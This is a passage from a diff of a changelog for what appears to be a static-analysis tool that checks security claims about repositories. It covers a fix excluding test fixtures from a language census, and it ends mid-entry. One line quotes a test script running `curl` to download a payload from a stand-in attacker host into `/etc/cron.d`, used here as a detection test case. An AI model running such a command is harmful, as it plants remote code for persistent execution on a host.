@@ -22,6 +22,21 @@ This changelog tracks the **tool version** (package releases). The **schema vers
   **Not closed by this, and named rather than implied:** ADR-0016 specified a fourth verdict ("confirmed with caveats") that remains unimplemented — changing verdict *vocabulary* is a different risk class from adding a field, since consumers branch on `verdict`. And `--taint-sanitizers` remains an untested neighbour: three attempts produced no valid A/B (two placed the sanitizer in the same function as the source, a shape the tool discloses only `ddg` honours; the third had no baseline finding), so it is recorded as untested rather than counted safe.
 
 ### Fixed
+- **One fixture file in an uncatalogued language blocked every claim in the repo (INV-dabuf, partial).** `verify-claims` already discards test/fixture/migration-**sourced** taint flows by default (`include_non_production=False`, WI-bifob) — a fixture reaching a real primitive is a fixture doing its job, not the shipped application doing it. The language census that decides whether *any* claim may be confirmed asked no such question: it counted every `calls` edge in the tree. One tool, two answers about whether a fixture counts.
+
+  Measured on hypergumbo's own self-proof (`verify-claims . --claims docs/hypergumbo.claims.yaml`, live run):
+
+  | | verdicts | blocking languages |
+  |---|---|---|
+  | before | 18/18 inconclusive, rc 2 | `bash, csharp, solidity` |
+  | after | 18/18 inconclusive, rc 2 | `bash` |
+
+  **This narrows the residual; it does not close INV-dabuf, and the item stays violated.** The file census is why: csharp is 3 files and solidity 1, all under `tests/fixtures/`, while bash is 44 files and mostly real (`scripts/lib/github-api.sh`, `.githooks/`, `.agent/hooks/`) — scripts that curl the GitHub API, `git push`, and `rm`. The tracker item and the lab notebook both recorded that all three blockers were fixtures; that was wrong for bash, and checking file by file is what corrected it. What the change buys is an honest reason: the previous one invited a reader to believe three catalogues were missing when two of the three were fixture-only noise.
+
+  The classifier is imported rather than re-derived — `_source_scope`'s body became `symbol_source_scope`, consumed by both the flow filter and the census — and `--include-non-production-sources` widens both, so they cannot disagree in either direction. The narrowing is applied to the **edge list**, not to the language set, so the census and the `compute_boundary_coverage` call below it walk one population: scoping only the first check left the verdict blocking anyway, which is INV-motos again (sharing a predicate is not enough when callers run it over different populations). `compute_boundary_coverage` itself is untouched, so **boundary** claim verdicts are unaffected.
+
+  **Explicitly not taken:** the item also lists "scope the gate to languages reachable from the claim's declared sources" as cheap. As stated it fails open — reachability would be computed by the same analysis whose completeness is in question, and a Python→bash crossing is a *subprocess boundary* with no edge into the bash file's symbols, so "bash is unreachable" would be true by construction for every claim. Filed separately.
+
 - **Opacity was a favour the catalogue chose to do, and six correct lines of YAML could withdraw it (INV-larol P1).** INV-gahuz established that a call classified `subprocess` blocks confirmation of every *other* boundary — control left the process, so "no chains found" means "none I could see". It asked that question of the **catalogue**. One producer knows a call is an opaque launch with no catalogue at all: the bash analyzer stamps `meta.io_boundary = "command_launch"` directly on an external-command edge, because there is no bash catalogue to match against and [ADR-0016](docs/adr/0016-io-boundary-analysis.md) rules one out. That channel was never read.
 
   Measured on the shipped CLI — no flags, no overlay — against a two-line script whose only command is `curl -o /etc/cron.d/pwned "https://evil.example/payload"`, claim *"this repo never writes to the host filesystem"*:
